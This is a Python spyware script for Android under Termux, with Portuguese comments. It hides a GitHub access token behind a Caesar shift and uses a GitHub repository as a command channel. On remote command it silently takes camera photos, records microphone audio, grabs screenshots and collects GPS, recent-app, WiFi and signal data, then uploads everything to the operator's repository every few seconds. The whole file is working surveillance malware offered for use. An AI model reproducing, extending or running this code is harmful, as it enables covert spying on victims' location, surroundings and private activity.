import os, json, time, subprocess, requests, base64, random, string
from datetime import datetime

def dec(t):
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    return r

TOKEN = dec("now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da")
REPO = "gynbetfc/eyelive"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
CONFIG = "/data/data/com.termux/files/home/.eyelive_key"
MEDIA = "/data/data/com.termux/files/home/eyelive_media"
os.makedirs(MEDIA, exist_ok=True)

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return ""

if os.path.exists(CONFIG):
    with open(CONFIG) as f: KEY = f.read().strip()
else:
    KEY = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    with open(CONFIG, 'w') as f: f.write(KEY)

print(f"SPY - {KEY}")

def salvar(nome, conteudo):
    try:
        fn = f"dados/{KEY}/{nome}"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        encoded = base64.b64encode(conteudo.encode() if isinstance(conteudo, str) else conteudo).decode()
        r = requests.get(url, headers=HEADERS)
        p = {"message":"Up","content":encoded,"branch":"main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        requests.put(url, json=p, headers=HEADERS)
    except: pass

def coletar_tudo():
    dados = {"time": datetime.now().strftime("%H:%M:%S"), "key": KEY}
    
    # Bateria
    b = shell("termux-battery-status 2>/dev/null")
    if b:
        try: dados["bateria"] = str(json.loads(b).get("percentage","?")) + "%"
        except: pass
    
    # GPS
    g = shell("termux-location 2>/dev/null")
    if g:
        try:
            gd = json.loads(g)
            dados["gps"] = {"lat": gd.get("latitude",0), "lng": gd.get("longitude",0)}
        except: pass
    
    # Apps recentes
    a = shell("dumpsys activity recents 2>/dev/null | grep 'Recent #' | head -5")
    if a: dados["apps"] = [x.strip() for x in a.split('\n') if x.strip()]
    
    # WiFi
    w = shell("dumpsys wifi 2>/dev/null | grep 'mWifiInfo' | head -1")
    if w: dados["wifi"] = w.strip()[:100]
    
    # Sinal
    s = shell("dumpsys telephony.registry 2>/dev/null | grep 'mSignalStrength' | head -1")
    if s: dados["sinal"] = s.strip()[:80]
    
    return json.dumps(dados)

def foto(cam=0):
    path = f"{MEDIA}/foto.jpg"
    shell(f"termux-camera-photo -c {cam} {path} 2>/dev/null")
    time.sleep(1)
    if os.path.exists(path):
        with open(path, 'rb') as f: return base64.b64encode(f.read()).decode()
    return ""

def audio():
    path = f"{MEDIA}/audio.aac"
    shell(f"termux-microphone-record -f {path} -l 10 -q 2>/dev/null")
    time.sleep(12)
    if os.path.exists(path):
        with open(path, 'rb') as f: return base64.b64encode(f.read()).decode()
    return ""

def screenshot():
    path = f"{MEDIA}/screen.png"
    shell(f"screencap {path} 2>/dev/null")
    time.sleep(1)
    if os.path.exists(path):
        with open(path, 'rb') as f: return base64.b64encode(f.read()).decode()
    return ""

while True:
    try:
        url = f"https://api.github.com/repos/{REPO}/contents/comandos/{KEY}.json"
        r = requests.get(url, headers=HEADERS)
        if r.status_code == 200:
            data = r.json()
            cmd = json.loads(base64.b64decode(data['content']).decode()).get("cmd","")
            res = ""
            if cmd == "foto_frontal": res = foto(0)
            elif cmd == "foto_traseira": res = foto(1)
            elif cmd == "audio": res = audio()
            elif cmd == "screenshot": res = screenshot()
            elif cmd == "status": res = coletar_tudo()
            salvar(f"r_{datetime.now().strftime('%H%M%S')}.json", json.dumps({"cmd":cmd,"result":res}))
            requests.delete(url, json={"message":"OK","sha":data['sha'],"branch":"main"}, headers=HEADERS)
        salvar("status.json", coletar_tudo())
    except: pass
    time.sleep(5)
